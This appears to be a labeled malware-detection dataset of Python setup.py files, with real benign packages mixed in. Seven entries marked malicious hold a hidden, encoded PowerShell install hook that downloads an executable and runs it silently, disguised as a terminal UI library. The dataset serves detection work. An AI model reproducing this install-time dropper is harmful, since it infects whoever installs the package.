{"idx": "esqpepretool-1.15", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpepretool',\n    packages = ['modlib'],\n    version = '10.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-encodepushhydra-5.68", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-encodepushhydra',\n    packages = ['modlib'],\n    version = '9.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "docxcompose-1.3.5", "func": "# -*- coding: utf-8 -*-\n\"\"\"Installer for the docxcompose package.\"\"\"\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\ntests_require = [\n    'pytest',\n]\n\nsetup(\n    name='docxcompose',\n    version='1.3.5',\n    description=\"Compose .docx documents\",\n    long_description=(open(\"README.rst\").read() + \"\\n\" +\n                      open(\"HISTORY.txt\").read()),\n    # Get more from https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: MIT License\",\n    ],\n    keywords='Python DOCX Word OOXML',\n    author='Thomas Buchberger',\n    author_email='t.buchberger@4teamwork.ch',\n    url='https://github.com/4teamwork/docxcompose',\n    license='MIT license',\n    packages=find_packages(exclude=['ez_setup']),\n    include_package_data=True,\n    zip_safe=True,\n    install_requires=[\n        'lxml',\n        'python-docx >= 0.8.8',\n        'setuptools',\n        'six',\n    ],\n    extras_require={\n        'test': tests_require,\n        'tests': tests_require,\n    },\n    entry_points={\n        'console_scripts': [\n            'docxcompose = docxcompose.command:main'\n      ]\n  },\n)\n", "target": 0}
{"idx": "eth-bloom-1.0.4", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import setup, find_packages\n\nextras_require = {\n    'test': [\n        \"pytest==3.0.7\",\n        \"hypothesis==3.7.0\",\n        \"tox==2.6.0\",\n    ],\n    'lint': [\n        \"flake8>=3.5.0,<4.0.0\",\n        'mypy<0.600',\n    ],\n    'deploy': [\n        'bumpversion>=0.5.3,<1.0.0',\n        'wheel>=0.30.0,<1.0.0',\n    ],\n    'dev': [\n        \"twine\",\n    ],\n}\n\nextras_require['dev'] = (\n    extras_require['deploy'] +\n    extras_require['dev'] +\n    extras_require['test'] +\n    extras_require['lint']\n)\n\nsetup(\n    name='eth-bloom',\n    # *IMPORTANT*: Don't manually change the version here. Use the 'bumpversion' utility.\n    version='1.0.4',\n    description=\"\"\"Python implementation of the Ethereum Trie structure\"\"\",\n    long_description_markdown_filename='README.md',\n    author='Piper Merriam',\n    author_email='pipermerriam@gmail.com',\n    url='https://github.com/ethereum/eth-bloom',\n    include_package_data=True,\n    py_modules=['eth_bloom'],\n    setup_requires=['setuptools-markdown'],\n    install_requires=[\n        \"eth-hash[pycryptodome]>=0.3.1,<0.4.0\",\n    ],\n    python_requires='>=3.6, <4',\n    extras_require=extras_require,\n    license=\"MIT\",\n    zip_safe=False,\n    package_data={'eth_bloom': ['py.typed']},\n    keywords='ethereum blockchain evm trie merkle',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n)\n", "target": 0}
{"idx": "tpnvidiainfopong-4.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpnvidiainfopong',\n    packages = ['modlib'],\n    version = '9.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfcraftpaypalultra-6.31", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcraftpaypalultra',\n    packages = ['modlib'],\n    version = '9.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-isort-4.2.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nimport re\n\n\ndef get_version(file=\"flake8_isort.py\"):\n    with open(file) as f:\n        for line in f:\n            m = re.match(r\"^__version__ = '(?P<version>.*?)'$\", line)\n            if m:\n                return m.group('version')\n\n\nshort_description = 'flake8 plugin that integrates isort .'\n\nlong_description = '{0}\\n{1}'.format(\n    open('README.rst').read(),\n    open('CHANGES.rst').read(),\n)\n\n\nsetup(\n    name='flake8-isort',\n    version=get_version(),\n    description=short_description,\n    long_description=long_description,\n    # Get more from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: GNU General Public License v2 (GPLv2)',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Quality Assurance',\n    ],\n    keywords='pep8 flake8 isort imports',\n    author='Gil Forcada',\n    author_email='gil.gnome@gmail.com',\n    url='https://github.com/gforcada/flake8-isort',\n    license='GPL version 2',\n    py_modules=['flake8_isort', ],\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\n        'flake8 >= 3.2.1, <6',\n        'isort >= 4.3.5, <6',\n    ],\n    extras_require={\n        'test': ['pytest-cov'],\n    },\n    entry_points={\n        'flake8.extension': ['I00 = flake8_isort:Flake8Isort', ],\n    },\n)\n", "target": 0}
{"idx": "gender-guesser-0.4.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\nfrom io import open\nimport sys\n\n\nclass Tox(TestCommand):\n    user_options = [('tox-args=', 'a', \"Arguments to pass to tox\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.tox_args = None\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        # import here, cause outside the eggs aren't loaded\n        import tox\n        import shlex\n        args = self.tox_args\n        if args:\n            args = shlex.split(self.tox_args)\n        errno = tox.cmdline(args=args)\n        sys.exit(errno)\n\nsetup(\n    name='gender-guesser',\n    version='0.4.0',\n    author='Israel Saeta P\u00e9rez',\n    author_email='israel@lead-ratings.com',\n    packages=['gender_guesser'],\n    package_dir={'gender_guesser': 'gender_guesser'},\n    package_data={'gender_guesser': ['data/*.txt']},\n    test_suite='test',\n    tests_require=['tox'],\n    cmdclass={'test': Tox},\n    url='https://github.com/lead-ratings/gender-guesser',\n    license='GPLv3',\n    description='Get the gender from first name.',\n    long_description=open('README.rst', encoding='utf-8').read(),\n)\n", "target": 0}
{"idx": "func_timeout-4.3.5", "func": "#!/usr/bin/env python\n'''\n    Copyright (c) 2016, 2017 Tim Savannah All Rights Reserved.\n    This software is licensed under the terms of the Lesser GNU General Public License Version 2.1 (LGPLv2.1)\n\n    You should have received a copy of this with the source distribution as LICENSE,\n    otherwise the most up to date license can be found at\n    https://github.com/kata198/func_timeout/LICENSE\n\n'''\n\nimport os\nimport sys\nfrom setuptools import setup\n\n\nif __name__ == '__main__':\n\n    dirName = os.path.dirname(__file__)\n    if dirName and os.getcwd() != dirName:\n        os.chdir(dirName)\n\n    summary = 'Python module which allows you to specify timeouts when calling any existing function. Also provides support for stoppable-threads'\n\n    try:\n        with open('README.rst', 'rt') as f:\n            long_description = f.read()\n    except Exception as e:\n        sys.stderr.write('Error reading from README.rst: %s\\n' %(str(e),))\n        log_description = summary\n\n    setup(name='func_timeout',\n            version='4.3.5',\n            packages=['func_timeout'],\n            author='Tim Savannah',\n            author_email='kata198@gmail.com',\n            maintainer='Tim Savannah',\n            url='https://github.com/kata198/func_timeout',\n            maintainer_email='kata198@gmail.com',\n            description=summary,\n            long_description=long_description,\n            license='LGPLv2',\n            keywords=['function', 'timeout', 'call', 'terminate', 'runtime', 'max', 'seconds', 'after', 'execution'],\n            classifiers=['Development Status :: 5 - Production/Stable',\n                         'Programming Language :: Python',\n                         'License :: OSI Approved :: GNU Lesser General Public License v2 (LGPLv2)',\n                         'Programming Language :: Python :: 2',\n                          'Programming Language :: Python :: 2.7',\n                          'Programming Language :: Python :: 3.4',\n                          'Programming Language :: Python :: 3.5',\n                          'Programming Language :: Python :: 3.6',\n                          'Programming Language :: Python :: 3.7',\n                          'Topic :: Software Development :: Libraries :: Python Modules'\n            ]\n    )\n\n\n\n", "target": 0}
{"idx": "cymruwhois-1.6", "func": "from setuptools import setup\nfrom glob import glob\n\nsetup(name=\"cymruwhois\",\n    version=\"1.6\",\n    description=\"Client for the whois.cymru.com service\",\n    long_description=\"\"\"\nPerform lookups by ip address and return ASN, Country Code, and Netblock Owner::\n\n    >>> import socket\n    >>> ip = socket.gethostbyname(\"www.google.com\")\n    >>> from cymruwhois import Client\n    >>> c=Client()\n    >>> r=c.lookup(ip)\n    >>> print r.asn\n    15169\n    >>> print r.owner\n    GOOGLE - Google Inc.\n\n    \"\"\",\n\n    url=\"http://packages.python.org/cymruwhois/\",\n    download_url=\"http://github.com/JustinAzoff/python-cymruwhois/tree/master\",\n    license='MIT',\n    classifiers=[\n        \"Topic :: System :: Networking\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Development Status :: 5 - Production/Stable\",\n    ],\n    keywords='ASN',\n    author=\"Justin Azoff\",\n    author_email=\"justin@bouncybouncy.net\",\n    py_modules = [\"cymruwhois\"], \n    extras_require = {\n        'CACHE':  [\"python-memcached\"],\n        'docs' : ['sphinx'],\n        'tests' : ['nose'],\n    },\n    entry_points = {\n        'console_scripts': [\n            'cymruwhois   = cymruwhois:lookup_stdin',\n        ]\n    },\n    setup_requires=[\n    ],\n    test_suite='nose.collector',\n)\n", "target": 0}
{"idx": "selfgamevirtualad-1.51", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgamevirtualad',\n    packages = ['modlib'],\n    version = '9.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpinfoedstudy-7.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpinfoedstudy',\n    packages = ['modlib'],\n    version = '4.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-pipstudystr-10.88", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pipstudystr',\n    packages = ['modlib'],\n    version = '2.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eth-typing-3.1.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    'test': [\n        \"pytest>=6.2.5,<7\",\n        \"pytest-xdist\",\n        \"tox>=2.9.1,<3\",\n    ],\n    'lint': [\n        \"flake8==3.8.3\",\n        \"isort>=4.2.15,<5\",\n        \"mypy==0.782\",\n        \"pydocstyle>=3.0.0,<4\",\n    ],\n    'doc': [\n        \"sphinx>=4.2.0,<5\",\n        \"sphinx_rtd_theme>=0.1.9\",\n        \"towncrier>=21,<22\",\n    ],\n    'dev': [\n        \"bumpversion>=0.5.3,<1\",\n        \"pytest-watch>=4.1.0,<5\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n}\n\nextras_require['dev'] = (\n    extras_require['dev'] +  # noqa: W504\n    extras_require['test'] +  # noqa: W504\n    extras_require['lint'] +  # noqa: W504\n    extras_require['doc']\n)\n\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name='eth-typing',\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version='3.1.0',\n    description=\"\"\"eth-typing: Common type annotations for ethereum python packages\"\"\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='The Ethereum Foundation',\n    author_email='snakecharmers@ethereum.org',\n    url='https://github.com/ethereum/eth-typing',\n    include_package_data=True,\n    python_requires='>=3.6, <3.11',\n    extras_require=extras_require,\n    py_modules=['eth_typing'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    package_data={'eth_typing': ['py.typed']},\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n)\n", "target": 0}
{"idx": "flytekit-1.1.1", "func": "from setuptools import setup\n\nPLUGIN_NAME = \"athena\"\n\nmicrolib_name = f\"flytekitplugins-{PLUGIN_NAME}\"\n\nplugin_requires = [\"flytekit>=1.1.0b0,<1.2.0\"]\n\n__version__ = \"0.0.0+develop\"\n\nsetup(\n    name=microlib_name,\n    version=__version__,\n    author=\"flyteorg\",\n    author_email=\"admin@flyte.org\",\n    description=\"This package holds the Athena plugins for flytekit\",\n    namespace_packages=[\"flytekitplugins\"],\n    packages=[f\"flytekitplugins.{PLUGIN_NAME}\"],\n    install_requires=plugin_requires,\n    license=\"apache2\",\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Intended Audience :: Science/Research\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n        \"Topic :: Software Development\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n)\n", "target": 0}
{"idx": "django-modeltranslation-0.18.4", "func": "#!/usr/bin/env python\nimport pkg_resources\nfrom setuptools import setup\n\n# (1) check required versions (from https://medium.com/@daveshawley/safely-using-setup-cfg-for-metadata-1babbe54c108)\npkg_resources.require(\"setuptools>=39.2\")\n\nsetup()\n", "target": 0}
{"idx": "Flask-Session-0.4.0", "func": "\"\"\"\nFlask-Session\n-------------\n\nFlask-Session is an extension for Flask that adds support for\nServer-side Session to your application.\n\nLinks\n`````\n\n* `development version\n  <https://github.com/fengsp/flask-session/zipball/master#egg=Flask-dev>`_\n\n\"\"\"\nfrom setuptools import setup\n\n\nsetup(\n    name='Flask-Session',\n    version='0.4.0',\n    url='https://github.com/fengsp/flask-session',\n    license='BSD',\n    author='Shipeng Feng',\n    author_email='fsp261@gmail.com',\n    description='Adds server-side session support to your Flask application',\n    long_description=__doc__,\n    packages=['flask_session'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'Flask>=0.8',\n        'cachelib'\n    ],\n    test_suite='test_session',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "domain2idna-1.12.0", "func": "\"\"\"\ndomain2idna - The tool to convert a domain or a file with a list of domain to\nthe famous IDNA format.\n\nAuthor:\n    Nissar Chababy, @funilrys, contactTATAfunilrysTODTODcom\n\nContributors:\n    Let's contribute to domains2idna!!\n\nRepository:\n    https://github.com/PyFunceble/domain2idna\n\nLicense:\n    MIT License\n\n    Copyright (c) 2018-2019 Nissar Chababy\n    Copyright (c) 2019 PyFunceble\n\n    Permission is hereby granted, free of charge, to any person obtaining a copy\n    of this software and associated documentation files (the \"Software\"), to deal\n    in the Software without restriction, including without limitation the rights\n    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n    copies of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included in all\n    copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n    SOFTWARE.\n\"\"\"\nfrom re import compile as comp\nfrom unittest import TestLoader\n\nfrom setuptools import setup\n\n\ndef test_suite():\n    \"\"\"\n    This method will discover and run all the test\n    \"\"\"\n\n    test_loader = TestLoader()\n    tests = test_loader.discover(\"tests\", pattern=\"test_*.py\")\n    return tests\n\n\ndef 